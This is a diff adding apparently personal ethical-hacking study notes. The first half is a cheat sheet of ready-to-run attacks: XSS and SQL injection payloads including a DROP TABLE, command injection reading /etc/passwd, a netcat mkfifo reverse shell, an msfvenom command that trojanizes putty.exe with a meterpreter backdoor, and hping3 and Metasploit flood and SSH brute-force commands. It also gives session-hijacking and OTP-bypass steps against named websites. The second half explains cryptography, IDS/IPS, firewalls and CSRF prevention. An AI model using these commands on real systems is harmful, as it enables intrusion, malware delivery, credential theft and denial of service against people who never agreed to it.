@@ -1,0 +1,522 @@
+XSS (DOM, Reflected, Stored)
+	XSS DOM (Document Object Model)
+		instead of text, or in url we can put the script
+			<script>alert ("hello brother")</script>
+			<script>alert (document.cookie)</script>
+	XSS Stored
+		if there is a two sections like name and the msg we can put it like
+			name = tinku
+			msg = <script>alert ("hello brother")</script>
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+SQL Injection
+	1' or '1' = '1 UNION SELECT * from users;-- -&Submit=Submit
+		'1' = '1'     - always true condition
+		UNION SELECT * FROM users;          - UNION keyword combines the results of two SELECT queries.
+											- SELECT * FROM users attempts to fetch all columns and rows from the users table.    
+											- -- tells the SQL engine to ignore the rest of the line.
+	
+	why we use SQL injection ?	
+		Bypass authentication
+		Extract data from sensitive tables (e.g., users)
+		Access unauthorized information
+		
+	some common commands
+		' OR '1'='1
+		1 OR 1=1
+		" OR "1"="1" --
+		' OR '1'='1' --							Bypass login
+		' UNION SELECT ...						Combine and leak data
+		' AND 1=1 -- / ' AND 1=2 --				Boolean-based blind injection
+		' OR IF(1=1, SLEEP(5), 0) --			Time-based injection (MySQL)
+		DROP TABLE users; --					Destructive attack (for testing)
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Command Injection
+	Command injection is a type of vulnerability where an attacker injects and executes arbitrary commands on a system through an application that improperly handles user input.
+	Typically, this happens when an application interacts with the operating system's shell (e.g., sh, bash, cmd, etc.) and allows user input to be executed as part of a command without proper sanitization.
+	
+	file.txt && whoami
+	file.txt; ls -al
+	file.txt | cat /etc/passwd
+	; uname -a      it uses for the see OS version, hostname
+	
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Cryptographic Attack
+	BRUTEFORCE ATTACK
+			SSH Password BruteForce & DOS Attack (Using MSF)
+						Cracking the passwords for the SSH login using the following the steps is quite easy. So you need to start the mfsconsole 
+							mfsconsole
+							Use auxilary/scanner/ssh/ssh_login
+						Now you need to change few options, first check options using show options, now give USERNAME, RHOSTS (your target), and PASS_FILE. And then exploit. And hence hacked
+						
+	🛡️ Effective Ways to Prevent Brute Force Attacks:
+		1. Strong Password Policies
+		2. Two-Factor Authentication (2FA) / Multi-Factor Authentication (MFA)
+		3. IP Blacklisting / Whitelisting
+			- In that we can configure fail2ban to block ips
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Brute Force Attack
+	burpsuite
+		intercept on
+		open browser visit paul.nasawebtech.com
+		forward the packets
+		enter the passwords -enter
+		right click on packet - send to introducer
+		select the password - add ?
+		select bruteforce and other configuration
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Session Hijacking
+	open burpsuite
+		open browser visit paul.nasawebtech.com
+		check the packet and copy the session id copy to the notepad
+		and other user login change this session id with original session id
+		then we will get the log in using the session id
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Authorization bypass
+
+
+OTP Bypass
+	1) Turn off Burp Suite Interceptor and open your browser.
+	2) Search for "Xplore" on Google (or any site with an OTP vulnerability).
+	3) Click the "Register" button to begin the OTP verification process.
+	4) Turn on the Burp Suite Interceptor after clicking the register button.
+	5) Enter your phone number and click "Send OTP".
+		At this stage, the OTP request might not show in Burp Suite, meaning the verification is happening on the page itself.
+	6) Inspect the page by right-clicking and selecting "Inspect".
+	7) Search for the "Verify" button's code in the page’s source code.
+		You can find the OTP from this code.
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+DoS Attack
+	sudo msfconsole
+		use auxiliary/dos/tcp/synflood
+			show options
+			set RHOSTS         ----target ip-address
+			set LPORT          -----port that we used for attacking
+			exploit
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ZAP (DAST Tool)
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Ethical Hacking
+	DoS Attack on Host
+	 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	 
+	FOCA
+		FOCA
+			right click on project   ->  new project
+			select project  -> tinku      project name ->  pinki        domain website  ->  http://www.unipune.ac.in/      click on create
+			options  -> general key configuration      api key   ,    engine ID    -> save
+			search engine -> google         extensions  ->  all
+			search all
+			right click on download column  ->  download all
+			right click metadata  ->  extract
+			
+		CHROME for key
+			search on google
+				pragrammable search engine
+					
+	 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	Recon-NG
+		dashboard													# To check past modules used
+		help														# To check the commands
+		workspaces list/delete/create/select						# Workspace management
+		workspaces create newone									# Creating and deleting and listing the workspaces is very easy and intuitive.
+		modules load/reload/search									# we can create and manage the databases. 
+		snapshots take/list/delete									# we can also take the snapshot of the current workspace and make changes accordingly.
+		marketplace install <module-name>							# To install
+		marketplace search whois									# To search
+		marketplace install recon/domains-contacts/whois_pocs		# In order to install the module you need to install it by giving the full reference of the module.
+	 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	Shodan
+		have the inbuilt gui tool
+	 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	Report Generation (TreePad)
+	 
+	 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	Burp Suite Scanner / ZAP
+		sudo apt install zaproxy
+		also have the inbuilt gui tool
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
+what is port scanning? which tool is used for it?
+	Nmap
+		- Port Scanning is a technique used to discover open ports and services on a networked device.
+		- It’s like “knocking on doors” to see which ones are open.
+		
+		nmap used for the port scanning
+		
+			Sudo apt install nmap
+			Nmap -sn 192.168.1.0/24                 # shows all up IPs in a network
+			Nmap 192.168.0.1          				# scan for a particular ip
+			Nmap -sS [target]						# half connection
+			nmap -sT 192.168.10.10					# full connection
+			Nmap -sN [target]						# null scan
+			Nmap -sX [target]						# XMAS scan
+			Nmap -sI [target]						# IDLE scan
+			Nmap -sF [target]						# FIN scan
+			nmap -A 192.168.0.116					# 
+			nmap -Pn 192.168.0.116					# command to ping without giving the ping or say without using for the discovery protocols.
+			sudo nmap -sp 172.16.0.0/21
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	 
+	Nessus
+	 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	 
+	Netcat
+		The command nc allows you to communicate with the other machine across your network, all you need to do is create a socket and bind it to the port and start the conversation.
+			On Machine 1
+				nc -l 1337
+			On Machine 2
+				nc <ip-address> 1337
+		or
+			nc -nlvp 1337
+			rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /your/shell/path -i 2>&1 | nc <localhost/IPAddress> 1337 > /tmp/f
+			127.0.0.1 & ls -la & pwd & whoami & hostname
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	Password Cracking
+		wfuzz -c -w ~/password.txt -b "security:low; PHPSESSID=document.cookie" "http://127.0.0.1/dvwa/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login" 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	MAC Flooding
+		sudo macof -i eth0
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	SMURF ATTACK
+		it is type of dos attack that will ping the target machine with random ip addresses
+			sudo hping3 --icmp -c 1 192.168.0.255 --rand-source --flood
+		
+		attcker exploits with spoofed ip address.
+			sudo hping3 -S -p 80 --flood 192.168.100.100 -a 192.168.10.10               - source 10.10 dest 100.100
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	 
+	LAND
+		attack that will be the same source and target ip address.
+			sudo hping3 -S -p $SOURCE_IP -a $DESTINATION_IP --flood
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	 
+	ICMP , SYN Flood
+		sudo hping3 --icmp --flood 192.168.100.100
+				it provides the icmp packet to this ip.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+	 
+	Honeypot (Cowrie)
+		kali machine
+			sudo msfconsoleonh
+			use auxiliary/scanner/ssh/ssh_login
+				set RHOST
+				set LPORT
+				set USER_FILE ………..
+				set STOP ON SUCCESS true
+				exploit
+			sudo nano user_pass.txt
+			Root root
+			Root admin
+			Admin root
+			Admin admin
+			Star abhi
+			Star admin@123
+		
+		debian machine
+			sudo apt install docker.io
+			sudo nano /etc/ssh/sshd_config 
+				Uncomment port 22 -------assign that we want
+				Save file change the port 22 to 2222
+			docker run -p 22:2222 cowrie/cowrie:latest
+					
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	 
+	Trojanhorse
+		kali
+			wget .........    #application
+			sudo msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.10.10 LPORT=8000 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o myputty.exe
+			
+			msfconsole
+			set payload windows/meterpreter/reverse_tcp
+				set LHOST 192.168.10.10
+				set LPORT 8000
+				exploit
+				
+				help to get various options that you can perform.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+In security concept what is cryptography ? types ? where they are used ?
+	🔐 What is Cryptography in Security?
+		- Cryptography is the science and art of securing information by transforming it into an unreadable format so that only authorized parties can read or process it.
+		- It protects data confidentiality, integrity, authenticity, and non-repudiation.
+	
+	🧠 Key Concepts in Cryptography:
+		|-----------------------------------------------------------------------------|
+		| Term           | Meaning                                                    |
+		| -------------- | ---------------------------------------------------------- |
+		|   Plaintext    | Original readable data                                     |
+		|   Ciphertext   | Encrypted unreadable data                                  |
+		|   Encryption   | Converting plaintext to ciphertext                         |
+		|   Decryption   | Converting ciphertext back to plaintext                    |
+		|   Key          | A value used with an algorithm to encrypt/decrypt data     |
+		|   Algorithm    | Mathematical formula used to perform encryption/decryption |
+		|-----------------------------------------------------------------------------|
+	
+	🧩 Types of Cryptography:
+		1. Symmetric Key Cryptography (Secret Key)
+			- Same key is used for both encryption and decryption.
+			- Fast but key must be shared securely.
+			- Examples: AES, DES, Blowfish, RC4
+			- Use Cases: File encryption, secure communication in VPNs
+
+		2. Asymmetric Key Cryptography (Public Key)
+			- Uses a public key to encrypt and a private key to decrypt.
+			- Secure key exchange, but slower than symmetric.
+			- Examples: RSA, ECC, ElGamal
+			- Use Cases: SSL/TLS, digital signatures, email encryption (e.g., PGP)
+			
+	✅ Benefits of Cryptography:
+		- Confidentiality – Only intended parties can access the data.
+		- Integrity – Data hasn’t been changed.
+		- Authentication – Confirms identity of sender.
+		- Non-repudiation – Prevents denial of a valid action (via digital signatures).
+		
+	📌 Where Cryptography is Used:
+		|-------------------------------------------------------------------------|
+		| Domain                | Usage Example                                   |
+		| --------------------- | ----------------------------------------------- |
+		|   Web Security        | HTTPS uses TLS with RSA/AES for secure browsing |
+		|   Email               | PGP, S/MIME to encrypt email messages           |
+		|   File Storage        | Encrypting files with AES                       |
+		|   Banking & Finance   | Secure transactions, OTP, credit card data      |
+		|   Authentication      | Passwords hashed and stored securely            |
+		|   Blockchain/Crypto   | Bitcoin uses ECC and SHA-256                    |
+		|   VPNs                | Secure tunneling with encryption                |
+		|-------------------------------------------------------------------------|
+		
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+IDS & IPS
+	🔎 IDS (Intrusion Detection System)
+		- It detects attacks but does not block them.
+		
+		✅ Key Features:
+			- Monitors network or system traffic for suspicious activity.
+			- Alerts admin if an attack is detected.
+			- Works in passive mode.
+		
+		🔧 Types of IDS:
+			- NIDS – Network-based IDS (e.g., Snort)
+			- HIDS – Host-based IDS (e.g., OSSEC)
+		
+		📍 Use Case:
+			- Detecting port scans, malware signatures, policy violations.
+		
+	🛡️ IPS (Intrusion Prevention System)
+		-It detects and blocks attacks in real-time.
+		
+		✅ Key Features:
+			- Monitors and actively blocks malicious traffic.
+			- Can drop packets, reset connections, or quarantine systems.
+			- Works inline with the traffic flow.
+		
+		📍 Use Case:
+			- Blocking brute-force login attempts, DoS attacks, and malware.
+		
+		🧠 Key Differences:
+			|---------------------------------------------------------------------------------------------------|
+			| Feature               | IDS                             | IPS                                     |
+			| --------------------- | ------------------------------- | --------------------------------------- |
+			|   Full Form           | Intrusion Detection System      | Intrusion Prevention System             |
+			|   Mode                | Passive (only alerts)           | Active (detects & blocks)               |
+			|   Traffic Placement   | Out-of-band (monitor only)      | Inline (between source and destination) |
+			|   Response            | Alerts admin                    | Takes action (block, reset, etc.)       |
+			|   False Positives     | Generates alerts                | May block legitimate traffic if wrong   |
+			|   Use in Industry     | Audit, analysis, SOC monitoring | Real-time protection for networks       |
+			|---------------------------------------------------------------------------------------------------|
+			
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+What is CIA ? explain with example ?
+	🧱 CIA Stands For:
+		|--------------------------------------------------------------------|
+		| Term                    | Meaning                                  |
+		| ----------------------- | ---------------------------------------- |
+		|   C   – Confidentiality | Protecting data from unauthorized access |
+		|   I   – Integrity       | Ensuring data is accurate and unaltered  |
+		|   A   – Availability    | Ensuring systems and data are accessible |
+		|--------------------------------------------------------------------|
+		
+	✅ 1. Confidentiality
+		- Ensures only authorized users can access sensitive data.
+			🔒 How it works:
+				- Encrypt data
+				- Use strong passwords
+				- Implement access control
+			📌 Example:
+				- Your online banking details are encrypted so that only you (authorized user) can see the balance and transaction history.
+	✅ 2. Integrity
+		- Ensures data is not changed by unauthorized users or during transmission.
+			🔧 How it works:
+				- Use hash functions (e.g., SHA-256)
+				- Use digital signatures
+				- Version control and checksums
+			📌 Example:	
+				- If someone changes a transaction amount in a bank's database, the system detects a hash mismatch, flagging a possible data integrity issue.
+	✅ 3. Availability
+		- Ensures authorized users can access information and services when needed.
+			⚙️ How it works:
+				- Use backups and failover systems
+				- Protect against DDoS attacks
+				- Maintain uptime with load balancing
+			📌 Example:
+				- You can access your email or cloud storage 24/7 because the provider ensures availability with redundant servers and disaster recovery mechanisms.	
+	
+	🧠 Real-World Example (CIA Applied Together):
+		📲 WhatsApp Communication:
+			- Confidentiality: Uses end-to-end encryption to prevent others from reading your messages.
+			- Integrity: If a message is tampered with in transit, it’s rejected or flagged.
+			- Availability: WhatsApp uses multiple data centers to ensure the app works anytime worldwide.
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+What is Firewall ? what are its types ?
+	🔥 What is a Firewall in Cybersecurity?
+		- A firewall is a network security device (hardware or software) that monitors and controls incoming and outgoing 
+			network traffic based on predefined security rules.
+		- Acts as a barrier between a trusted internal network and untrusted external networks (like the internet).
+		- Blocks or allows traffic based on rules (IP, port, protocol, etc.).
+		- Prevents unauthorized access, malware, and hacking attempts.
+		
+	🧱 Types of Firewalls:
+		1. Packet-Filtering Firewall
+			- Works at the network layer (Layer 3).
+			- Checks source/destination IP address, port, and protocol.
+			- Does not inspect the actual content of packets.
+			
+			📌 Use Case: Small routers or edge devices to allow/block basic traffic.
+		
+		2. Stateful Inspection Firewall
+			- Tracks the state of connections (TCP sessions).
+			- Only allows packets that are part of an established session.
+			- More secure than packet filtering.
+			
+			📌 Use Case: Enterprise firewalls that allow return traffic from legitimate requests.
+
+		3. Application-Level Gateway (Proxy Firewall)
+			- Works at the application layer (Layer 7).
+			- Intercepts and inspects traffic (e.g., HTTP, FTP).
+			- Can filter based on content, not just port/IP.
+
+			📌 Use Case: Web proxy server that filters websites or scans for malware in HTTP/FTP traffic.
+		
+		4. Cloud Firewall (Firewall-as-a-Service)
+			- Hosted in the cloud, protects cloud infrastructure.
+			- Often integrated with cloud providers like AWS, Azure, GCP.
+
+			📌 Use Case: Securing VMs, containers, or serverless apps in the cloud.
+
+			|----------------------------------------------------------------------------------------------------------------|
+			| Type                        | Layer       | Key Feature                       | Example                        |
+			| --------------------------- | ----------- | --------------------------------- | ------------------------------ |
+			| Packet-Filtering            | Network     | Filters by IP, Port, Protocol     | Cisco ACLs                     |
+			| Stateful Inspection         | Transport   | Tracks connection state           | pfSense                        |
+			| Proxy (Application Gateway) | Application | Inspects application data         | Squid Proxy                    |
+			| Next-Gen Firewall (NGFW)    | All layers  | Deep inspection, IPS, App control | Palo Alto, Fortinet            |
+			| Host-Based Firewall         | Host level  | Protects individual device        | Windows Firewall               |
+			| Cloud Firewall              | Cloud Infra | Protects cloud resources          | AWS Security Groups, Azure NSG |
+			|----------------------------------------------------------------------------------------------------------------|			
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Explain CSRF ? how to prevent it ?
+	🛡️ What is CSRF (Cross-Site Request Forgery)?
+		- CSRF is a type of web security vulnerability where an attacker tricks a user into performing unintended actions 
+			on a web application where the user is authenticated.
+	
+	🧠 How CSRF Works:
+		- User is logged in to a trusted website (e.g., banking site).
+		- Attacker sends a malicious link or script (via email, image, iframe, etc.).
+		- If user clicks it while still logged in, the browser sends the request with stored cookies/session.
+		- The server trusts the request and performs the action (like transferring money).
+	
+	✅ How to Prevent CSRF Attacks
+		|---------------------------------------------------------------------------|
+		| Prevention Method         | Description                                   |
+		| ------------------------- | --------------------------------------------- |
+		|   CSRF Tokens             | Unique per request/form, verified server-side |
+		|   SameSite Cookies        | Prevents automatic cross-site cookie sending  |
+		|   Double Submit Cookies   | Token in both cookie and header               |
+		|   Use POST/PUT            | Avoid state-changing GET requests             |
+		|   Token Auth (JWT)        | Don’t rely on browser-managed cookies         |
+		|---------------------------------------------------------------------------|	
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
